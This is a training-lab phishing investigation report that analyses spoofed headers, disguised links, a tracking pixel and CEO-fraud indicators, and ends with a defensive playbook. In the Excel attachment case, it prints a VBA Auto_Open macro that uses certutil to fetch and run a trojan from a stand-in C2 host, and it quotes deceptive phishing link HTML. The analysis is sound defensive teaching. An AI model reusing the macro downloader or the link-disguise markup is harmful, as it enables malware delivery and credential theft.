# Email Security Triage & Forensics: End-to-End Phishing Investigation Report

![phising](Image/phising.jpg)

---

## 📌 Project Context & Disclaimer
> **⚠️ Educational Lab Scenario:** 
> This investigation was conducted using simulated artifacts (.eml/.msg email files, header logs, and untrusted links/files) provided by the Linuxenic Corp. cybersecurity training platform. This report has been compiled chronologically into a single comprehensive case study to demonstrate the incident response capabilities of a SOC analyst. 
---

## 📖 Incident Workflow & Methodology
To mirror a real-world Security Operations Center (SOC) triage process, this portfolio covers four distinct phishing techniques commonly engineered by threat actors, transitioning from manual log analysis to static file forensics and threat intelligence automation.

### 📁 Phase 1: Manual Header Analysis & Identity Spoofing Detection


**Case 1**
![Ikon Email](Image/email.png)

```
From
IT Support Team <support@linuxenic-corp.com>
To
employee@linuxenic-corp.com
Date
Mon, 27 Jan 2025 09:15:42 +0700
```

* **What:** The SOC team triaged a suspicious email claiming to originate from the internal IT Support Team (`support@linuxenic-corp.com`) targeting an employee. 
* **How:** A manual inspection of the raw email source code (*Show Original*) was conducted to verify sender authenticity by checking the mail routing logs and authentication markers (`SPF`, `DKIM`, `DMARC`).
* **Why & Findings:** 
  The analysis revealed a classic **Brand Impersonation & Identity Spoofing** attack. The header logs exposed severe mismatches:
  
Show original :
```
Return-Path: <bounce@suspicious-domain.xyz>
```
The Return-Path is different from the From field. The email actually came from **suspicious-domain.xyz**.

```
Received: from smtp-out.suspicious-domain.xyz
```
The original sending server is also not from linuxenic-corp.com

```
Received-SPF: fail
dkim=fail
dmarc=fail
```
```
X-Mailer: PHPMailer 6.5.0
X-PHP-Originating-Script: 0:send_phish.php
```
Sent using **PHPMailer** from the send_phish.php script. This indicates that this email was created using **phishing tools.**

**Investigation Report**
**1. Incident Summary**
  * Incident ID : INC-2006-002 | High (Potential Credential Harvesting / Malware Delivery)
  * Affected Assets : Employee email inbox
  * Description : The SOC team analyzed a suspicious email reported by an employee. The analysis revealed that the email was a phishing attempt that used sender name spoofing and urgency tactics to trick the victim into clicking on a malicious link (credential harvesting).

**2. Cyber Kill Chain Mapping**
  * Reconnaissance : The attacker compiles a list of the company's target email addresses (employees).
  * Weaponization : The attacker created a fake email from HR and sent it to employees
  * Delivery : The phishing email successfully bypassed the Spam Gateway filter and landed in the victim's inbox. 

**3. Forensic Evidence & Analysis**
Email Header Analysis
  * Displayed from : IT Support Team `<support@linuxenic-corp.com>`
  * Return-Path: `<bounce@suspicious-domain.xyz>`
  * Received-SPF: fail
  * dkim=fail
  * dmarc=fail

**Case 2**


![Ikon Email](Image/email2.png)


**Hidden URL & Hyperlink Analysis**
* **What:** It appears that there is nothing unusual about this email. The team needs to take a closer look in the **dev tools** to see if there is anything suspicious. There is a link embedded in an invisible 1x1-pixel image. The link is used to determine whether the recipient has viewed the email or not.

```
<img src="http://tracking.benefits-linuxenic.com/open.gif?id=emp001&amp;campaign=benefits2025" width="1" height="1" alt="" style="display:none;">
```
* **How :** The link also leads to a dangerous address. It says benefit.linuxenic-corp.com, but the actual link leads to malicious.xyz

```
<a href="http://linuxenic-corp.benefits-portal.suspicious-domain.xyz/enroll?ref=email"
   style="color:#1e3a5f;">https://benefits.linuxenic-corp.com/enroll</a>
```

* **Why & Findings :** A hidden link manipulation technique (hidden redirection) has been discovered. Attackers disguise links to make them appear safe in the body of an email, but the HTML code redirects users to the attacker’s server.

**Case 3**

![Ikon Email](Image/email3.png)

* **What:** This email may be malicious because it was not sent by DHL, but by **sfrloyer.com**
  ```
  Return-Path: <noreply@sfrloyer.com>
  ```
* **How:** The attacker sends a file purporting to be a notification from DHL. However, there is something suspicious about it: the file is in .xlsx format. Once the target opens the file, a script from the attacker runs automatically to download a malicious file from the attacker’s server and execute it immediately. Therefore, static file forensics was performed in an isolated Linux environment using the file command to verify its true extension, and the strings command to extract plaintext data.

To view the contents of an attachment in an email that you suspect is malicious, do not open the attachment directly. Use “file [file_name]” to view the original format of the attached file. Then examine the file's strings using “strings [file_name]”.


```
file DHL-Shipment-Notice.xlsx
```

```
strings DHL-Shipment-Notice.xlsx
```
  ```
  Shipment ID: DHL-7829341-LNX
Sender: Global Trading Co.
Destination: Jakarta, Indonesia
Weight: 2.5 kg
Status: In Transit
U~aq
Sub Auto_Open()
  Shell "cmd /c certutil -urlcache -split -f http://c2.malware-drop.xyz/dhl_trojan.exe %TEMP%\svchost.exe && start %TEMP%\svchost.exe"
End Sub
}PfJh
#h]5
http://dhl-tracking.shipment-update.malicious-domain.xyz/track?id=DHL-7829341
H.62
hkHP
t{%dhrD7
fp-e
(Ffe

```
Focus on 

```
Sub Auto_Open()
Shell "cmd /c certutil -urlcache -split -f http://c2.malware-drop.xyz/dhl_trojan.exe %TEMP%\svchost.exe && start %TEMP%\svchost.exe"
```
**Conclusion:** The script utilizes the Auto_Open() execution trigger. Upon opening, it spawns a command shell (cmd.exe) and abuses a legitimate native Windows binary (certutil.exe) to stealthily download a malicious payload (dhl_trojan.exe) from the C2 server, masquerading it as a legitimate system process (svchost.exe) in the temporary folder.


## Email Analysis With Tools

Using tools to analyze malicious emails greatly helps make the analysis process much faster and more efficient.

**Case 3**

![Ikon Email](Image/email4.png)

```
From
m.anderson@linuxenic-corp.com
To
employee@linuxenic-corp.com
Reply-To
m.anderson.ceo@protonmail.com
Date
Tue, 28 Jan 2025 09:14:22 +0000
```

```
Delivered-To: employee@linuxenic-corp.com
Return-Path: <ceo-urgent@offshore-bizfin.xyz>
Received: from mail-out.offshore-bizfin.xyz 
```
**What:** A targeted CEO Fraud/Spear-Phishing email impersonating the executive office `(m.anderson@linuxenic-corp.com)` was investigated. *Protonmail.com* is not a corporate email service, such emails should be treated with suspicion as potentially dangerous.The return path also doesn't match the “From” field. This indicates that the email is malicious. Any attachments sent via this email are also certainly malicious. Analyzing the contents of a malicious email attachment directly can be dangerous. Specialized tools for analyzing phishing emails are the most effective way to handle this.

```
INVOICE: GlobalTech Solutions Ltd.
Invoice No: GT-INV-2025-4847
Date: January 28, 2025
Due: January 28, 2025 (SAME DAY)
========================================
Service: Q4 IT Infrastructure Consulting
Amount: USD 47,250.00
========================================
Wire Transfer Details:
Bank: First Caribbean International Bank
Account Name: GlobalTech Solutions Ltd.
Account No: 8837-2941-0055-7721
SWIFT/BIC: FCIBJMKN
Reference: GT-Q4-LINUXENIC-2025
========================================
/URI (http://wire-payment.globaltech-invoice.xyz/pay?inv=GT-29481)
/URI (http://globaltech-portal.offshore-bizfin.xyz/confirm?ref=GT-Q4)
========================================
IoC Reference (Threat Intel):
SHA256: 6d55f25222831cce73fd9a64a8e5a63b002522dc2637bd2704f77168c7c02d88
Classification: Emotet Dropper (Epoch 5)
Source: MalwareBazaar / abuse.ch
```
**How:** Advanced triage tools were utilized to automatically parse the email components, extract indicators of compromise (IoCs), and correlate the file hashes with global security intelligence databases like VirusTotal.
Analyze the file contents to extract information and the SHA256 hash for comparison using specialized tools for phishing email analysis (**Virustotal**).

**Why & Findings:** Initial triage caught an external Reply-To mismatch pointing to a free public domain `(m.anderson.ceo@protonmail.com)` and a fraudulent transfer request of USD 47,250.00.
 * Malicious URIs: `http://wire-payment.globaltech-invoice.xyz`
 * SHA256 Hash: 6d55f25222831cce73fd9a64a8e5a63b002522dc2637bd2704f77168c7c02d88

The automated extraction pulled out malicious URIs and a file attachment hash:

![Ikon Email](Image/email5.png)

This file has been detected as malware. You can view a lot of information here, such as the malware family name, the original file name, etc.


## Incident Response & Mitigation Playbook ##

Based on the multi-phased forensic investigation above, the following immediate containment and strategic hardening measures were recommended:

**1. Immediate Containment (Tactic Action):**
   * **Network Blocking:** Block all malicious IoC domains (suspicious-domain.xyz, malicious.xyz, c2.malware-drop.xyz, and offshore-bizfin.xyz) at the corporate Firewall and Secure Web Gateway (SWG).
   * **EDR Blacklisting:** Feed the Emotet SHA256 hash into the Endpoint Detection and Response (EDR) system to automatically quarantine the file across all corporate endpoints.
   * **Mail Purging:** Execute a cluster-wide email purge script to permanently delete these specific phishing templates from all user mailboxes.

**2. Long-Term System Hardening (Strategic Defense):**
   * **Enforce Email Authentication:** Tighten corporate inbound mail rules to strictly REJECT emails that fail SPF, DKIM, and DMARC alignment checks to eliminate identity spoofing.
   * **Block Dangerous Office Macros:** Implement a Group Policy Object (GPO) to completely disable VBA macros in Microsoft Office files downloaded from the internet.
   * **User Security Awareness:** Launch targeted training focusing on Spear-Phishing/CEO Fraud identification and reporting procedures for finance/HR departments.


## Key Takeaway ##
* **Look Beyond the Display Name:** Tactic headers like Return-Path and authentication log fails are definitive indicators of truth; external display names should never be trusted blindly.
* **Living-off-the-Land (LotL) Awareness:** Attackers frequently abuse built-in system tools like certutil.exe to bypass traditional antivirus software, necessitating robust behavioral monitoring on endpoints.
